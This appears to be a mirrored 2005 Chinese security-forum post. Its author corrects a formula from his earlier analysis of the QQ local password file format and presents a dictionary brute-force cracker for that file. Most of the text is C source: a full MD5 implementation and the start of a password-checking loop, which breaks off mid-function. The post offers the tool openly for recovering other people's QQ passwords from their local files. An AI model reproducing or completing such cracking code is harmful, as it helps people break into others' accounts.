
# QQ 本地密码文件暴力破解代码

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-446.htm`](https://www.pediy.com/kssd/pediy07/pediy7-446.htm)

作者：冲出宇宙

作者声明：任何人都可以使用任何方式对本代码进行修改。

首先，向兄弟们表示严重的歉意。去年我写的那篇关于 QQ 本地密码文件格式的帖子，由于我的疏忽，把最后那个等式抄写错了。这个问题我最近才看到，之前我去研究其他东西去了。原贴见："http://bbs.pediy.com/printthread.php?threadid=7933"

错误的地方是：

```
3）for(i=0;i<16;i++)
{
m[i]=(!m[i])^al;//al 在这里指的是密码块数据的长度
//上面的文件中 al=10h;
}
```

这里，应该是：`m[i] = not (m[i] xor al)`, `al=0x10;`

昨天我无意中发现这个问题后，十分羞愧。我对我自己极不负责任的态度十分不满。为了向兄弟们表示歉意。特制作了一个简单的 QQ 本地密码文件暴力破解软件。

## 构成及源代码说明

1. 构成：VB 程序调用 VC 编写的 OCX，这样做是为了方便大家自己做界面。

2. OCX 的输出函数：只有一个：`void CQQDecoderCtrl::Decoder(LPCTSTR fileQQ, LPCTSTR filePwd)`，第一个参数是 QQ 的密码文件，第二个参数是密码字典。

3. 源代码：VB 的源代码不作介绍了，附件里面有。这里只说明一下 VC 的源代码（附件里面也有）。

```
//Md5 算法

typedef unsigned char UI8;
typedef char I8;
typedef unsigned long UI32;

//F, G, H and I are basic MD5 functions.
#define md5_F(x, y, z) (((x) & (y)) | ((~x) & (z)))
#define md5_G(x, y, z) (((x) & (z)) | ((y) & (~z)))
#define md5_H(x, y, z) ((x) ^ (y) ^ (z))
#define md5_I(x, y, z) ((y) ^ ((x) | (~z)))

// ROTATE_LEFT rotates x left n bits.
//  x<<<=n;
#define md5_ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))

// FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4.
//Rotation is separate from addition to prevent recomputation.
#define md5_FF(a, b, c, d, x, s, ac) { \
  (a) += md5_F ((b), (c), (d)) + (x) + (ac); \
  (a) = md5_ROTATE_LEFT ((a), (s)); \
  (a) += (b); \
}
#define md5_GG(a, b, c, d, x, s, ac) { \
  (a) += md5_G ((b), (c), (d)) + (x) + (ac); \
  (a) = md5_ROTATE_LEFT ((a), (s)); \
  (a) += (b); \
}
#define md5_HH(a, b, c, d, x, s, ac) { \
  (a) += md5_H ((b), (c), (d)) + (x) + (ac); \
  (a) = md5_ROTATE_LEFT ((a), (s)); \
  (a) += (b); \
}
#define md5_II(a, b, c, d, x, s, ac) { \
  (a) += md5_I ((b), (c), (d)) + (x) + (ac); \
  (a) = md5_ROTATE_LEFT ((a), (s)); \
  (a) += (b); \
}

// Constants for MD5Transform routine.
#define md5_S11 7
#define md5_S12 12
#define md5_S13 17
#define md5_S14 22
#define md5_S21 5
#define md5_S22 9
#define md5_S23 14
#define md5_S24 20
#define md5_S31 4
#define md5_S32 11
#define md5_S33 16
#define md5_S34 23
#define md5_S41 6
#define md5_S42 10
#define md5_S43 15
#define md5_S44 21

//Md5Tranform 代表了一轮 md5 变换

#define Md5Tranform \
  a = m_state[0];\
  b = m_state[1];\
  c = m_state[2];\
  d = m_state[3];\
  md5_FF (a, b, c, d, m_data[ 0], md5_S11, 0xd76aa478);\
  md5_FF (d, a, b, c, m_data[ 1], md5_S12, 0xe8c7b756);\
  md5_FF (c, d, a, b, m_data[ 2], md5_S13, 0x242070db);\
  md5_FF (b, c, d, a, m_data[ 3], md5_S14, 0xc1bdceee);\
  md5_FF (a, b, c, d, m_data[ 4], md5_S11, 0xf57c0faf);\
  md5_FF (d, a, b, c, m_data[ 5], md5_S12, 0x4787c62a);\
  md5_FF (c, d, a, b, m_data[ 6], md5_S13, 0xa8304613);\
  md5_FF (b, c, d, a, m_data[ 7], md5_S14, 0xfd469501);\
  md5_FF (a, b, c, d, m_data[ 8], md5_S11, 0x698098d8);\
  md5_FF (d, a, b, c, m_data[ 9], md5_S12, 0x8b44f7af);\
  md5_FF (c, d, a, b, m_data[10], md5_S13, 0xffff5bb1);\
  md5_FF (b, c, d, a, m_data[11], md5_S14, 0x895cd7be);\
  md5_FF (a, b, c, d, m_data[12], md5_S11, 0x6b901122);\
  md5_FF (d, a, b, c, m_data[13], md5_S12, 0xfd987193);\
  md5_FF (c, d, a, b, m_data[14], md5_S13, 0xa679438e);\
  md5_FF (b, c, d, a, m_data[15], md5_S14, 0x49b40821);\
  md5_GG (a, b, c, d, m_data[ 1], md5_S21, 0xf61e2562);\
  md5_GG (d, a, b, c, m_data[ 6], md5_S22, 0xc040b340);\
  md5_GG (c, d, a, b, m_data[11], md5_S23, 0x265e5a51);\
  md5_GG (b, c, d, a, m_data[ 0], md5_S24, 0xe9b6c7aa);\
  md5_GG (a, b, c, d, m_data[ 5], md5_S21, 0xd62f105d);\
  md5_GG (d, a, b, c, m_data[10], md5_S22,  0x2441453);\
  md5_GG (c, d, a, b, m_data[15], md5_S23, 0xd8a1e681);\
  md5_GG (b, c, d, a, m_data[ 4], md5_S24, 0xe7d3fbc8);\
  md5_GG (a, b, c, d, m_data[ 9], md5_S21, 0x21e1cde6);\
  md5_GG (d, a, b, c, m_data[14], md5_S22, 0xc33707d6);\
  md5_GG (c, d, a, b, m_data[ 3], md5_S23, 0xf4d50d87);\
  md5_GG (b, c, d, a, m_data[ 8], md5_S24, 0x455a14ed);\
  md5_GG (a, b, c, d, m_data[13], md5_S21, 0xa9e3e905);\
  md5_GG (d, a, b, c, m_data[ 2], md5_S22, 0xfcefa3f8);\
  md5_GG (c, d, a, b, m_data[ 7], md5_S23, 0x676f02d9);\
  md5_GG (b, c, d, a, m_data[12], md5_S24, 0x8d2a4c8a);\
  md5_HH (a, b, c, d, m_data[ 5], md5_S31, 0xfffa3942);\
  md5_HH (d, a, b, c, m_data[ 8], md5_S32, 0x8771f681);\
  md5_HH (c, d, a, b, m_data[11], md5_S33, 0x6d9d6122);\
  md5_HH (b, c, d, a, m_data[14], md5_S34, 0xfde5380c);\
  md5_HH (a, b, c, d, m_data[ 1], md5_S31, 0xa4beea44);\
  md5_HH (d, a, b, c, m_data[ 4], md5_S32, 0x4bdecfa9);\
  md5_HH (c, d, a, b, m_data[ 7], md5_S33, 0xf6bb4b60);\
  md5_HH (b, c, d, a, m_data[10], md5_S34, 0xbebfbc70);\
  md5_HH (a, b, c, d, m_data[13], md5_S31, 0x289b7ec6);\
  md5_HH (d, a, b, c, m_data[ 0], md5_S32, 0xeaa127fa);\
  md5_HH (c, d, a, b, m_data[ 3], md5_S33, 0xd4ef3085);\
  md5_HH (b, c, d, a, m_data[ 6], md5_S34,  0x4881d05);\
  md5_HH (a, b, c, d, m_data[ 9], md5_S31, 0xd9d4d039);\
  md5_HH (d, a, b, c, m_data[12], md5_S32, 0xe6db99e5);\
  md5_HH (c, d, a, b, m_data[15], md5_S33, 0x1fa27cf8);\
  md5_HH (b, c, d, a, m_data[ 2], md5_S34, 0xc4ac5665);\
  md5_II (a, b, c, d, m_data[ 0], md5_S41, 0xf4292244);\
  md5_II (d, a, b, c, m_data[ 7], md5_S42, 0x432aff97);\
  md5_II (c, d, a, b, m_data[14], md5_S43, 0xab9423a7);\
  md5_II (b, c, d, a, m_data[ 5], md5_S44, 0xfc93a039);\
  md5_II (a, b, c, d, m_data[12], md5_S41, 0x655b59c3);\
  md5_II (d, a, b, c, m_data[ 3], md5_S42, 0x8f0ccc92);\
  md5_II (c, d, a, b, m_data[10], md5_S43, 0xffeff47d);\
  md5_II (b, c, d, a, m_data[ 1], md5_S44, 0x85845dd1);\
  md5_II (a, b, c, d, m_data[ 8], md5_S41, 0x6fa87e4f);\
  md5_II (d, a, b, c, m_data[15], md5_S42, 0xfe2ce6e0);\
  md5_II (c, d, a, b, m_data[ 6], md5_S43, 0xa3014314);\
  md5_II (b, c, d, a, m_data[13], md5_S44, 0x4e0811a1);\
  md5_II (a, b, c, d, m_data[ 4], md5_S41, 0xf7537e82);\
  md5_II (d, a, b, c, m_data[11], md5_S42, 0xbd3af235);\
  md5_II (c, d, a, b, m_data[ 2], md5_S43, 0x2ad7d2bb);\
  md5_II (b, c, d, a, m_data[ 9], md5_S44, 0xeb86d391);\
  m_state[0] += a;\
  m_state[1] += b;\
  m_state[2] += c;\
  m_state[3] += d;\
///////////////////////////////////////
// QQ 解密正式开始
//////////////////////////////////////
//作者：冲出宇宙
//2005，11，1
//////////////////////////////////////
UI8 MD5Result[16];  //md5 加密后的结果
UI32 LoopNum;    //循环次数
UI32 QQNum;    //qq 号码
UI32 PwdNum;    //已经对多少个字符串进行了检查
CString Pwd;    //当前正确的密码
CString FileQQ,FilePwd;  //密码文件和密码字典文件
DWORD DecodeThreadId;
HANDLE DecodeThreadHandle;  //解密线程
CQQDecoderCtrl *Me;

//密码是否正确
bool IsPasswordCorrect(char* sPwd)
{
  UI32 m_state[4],m_data[16];
  register UI32 a,b,c,d;
  m_state[0] = 0x67452301L;
  m_state[1] = 0xefcdab89L;
  m_state[2] = 0x98badcfeL;
  m_state[3] = 0x10325476L;
  a = strlen(sPwd);
  memset(m_data,0,64);
  memcpy(m_data,sPwd,a);
  m_data[14] = a*8;
  ((UI8*)m_data)[a] = 0x80;
  Md5Tranform;
  memcpy(m_data,m_state,16);
  m_data[4] = 0x80;
  m_data[14] = 0x80;
  //主要轮次
  for(UI32 i=1;i<LoopNum;i++)
  {
    m_state[0] = 0x67452301L;
```
